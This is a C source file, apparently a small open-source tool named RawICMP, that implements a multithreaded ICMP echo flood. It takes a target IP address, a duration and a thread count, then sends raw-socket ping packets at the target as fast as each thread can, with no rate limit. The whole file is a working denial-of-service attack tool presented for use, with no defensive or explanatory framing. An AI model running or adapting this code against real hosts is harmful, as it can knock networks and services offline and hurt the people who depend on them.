/*
 *  RawICMP 
 *  Copyright (C) 2026  Mehmet Lotfi
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "stdio.h"
#include "stdlib.h"
#include "string.h"
#include "unistd.h"
#include "pthread.h"
#include "sys/socket.h"
#include "netinet/ip.h"
#include "netinet/ip_icmp.h"
#include "arpa/inet.h"
#include "time.h"
#define PACKET_SIZE 64
typedef struct
{
	struct sockaddr_in dest;
	int duration;
} thread_args;

unsigned short checksum (void *b , int len)
{
	unsigned short * buf = b;
	unsigned int sum = 0;
	unsigned short result;
	for (sum = 0 ; len > 1 ; len -= 2)
		sum += * buf++;
	if (len == 1)
		sum += * (unsigned char *) buf;
	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	result = ~sum;
	return result;
}

void *icmp_flood_thread (void *arg)
{
	thread_args * args = (thread_args *) arg;
	int sockfd = socket (AF_INET , SOCK_RAW , IPPROTO_ICMP);
	if (sockfd < 0)
	{
		fprintf (stderr , "[-] ERROR in Socket\n");
		pthread_exit (NULL);
	}
	time_t start_time = time (NULL);
	time_t current_time = start_time;
	int seq = 1;
	while (difftime (current_time , start_time) < args -> duration)
	{
		char packet [PACKET_SIZE];
		struct icmphdr * icmp = (struct icmphdr *) packet;
		memset (packet , 0 , PACKET_SIZE);
		icmp -> type = ICMP_ECHO;
		icmp -> code = 0;
		icmp -> un.echo.id = htons (getpid () & 0xFFFF);
		icmp -> un.echo.sequence = htons (seq++);
		icmp -> checksum = 0;
		icmp -> checksum = checksum (packet , PACKET_SIZE);
		if (sendto (sockfd , packet , PACKET_SIZE , 0 ,(struct sockaddr *) &args -> dest , sizeof (args -> dest)) < 0)
			fprintf (stderr , "[-] ERROR in sendto function\n");
		else
			printf ("Thread %lu sent ICMP Echo Request (seq=%d)\n" , pthread_self (), seq);
		current_time = time (NULL);
	}
	close (sockfd);
	pthread_exit (NULL);
}

int main (int argc , char ** argv)
{
	if (argc != 4)
	{
		fprintf (stderr , "[-] Usage: %s <target_ip> <duration_in_minutes> <thread_count>\n" , argv [0]);
		return -1;
	}
	char * target_ip = argv [1];
	int duration = atoi (argv [2]) * 60;
	int thread_count = atoi (argv [3]);
	struct sockaddr_in dest;
	memset (&dest , 0 , sizeof (dest));
	dest.sin_family = AF_INET;
	if (inet_pton (AF_INET , target_ip , &dest.sin_addr) != 1)
	{
		fprintf (stderr , "[-] Invalid IP address\n");
		return -1;
	}
	pthread_t threads [thread_count];
	thread_args args = {dest, duration};
	for (int i = 0 ; i < thread_count ; i++)
	{
		if (pthread_create (&threads[i] , NULL , icmp_flood_thread , &args) != 0)
		{
			fprintf (stderr , "[-] Thread creation failed");
			return -1;
		}
	}
	for (int i = 0 ; i < thread_count ; i++)
	{
		pthread_join (threads [i] , NULL);
	}
	return 0;
}
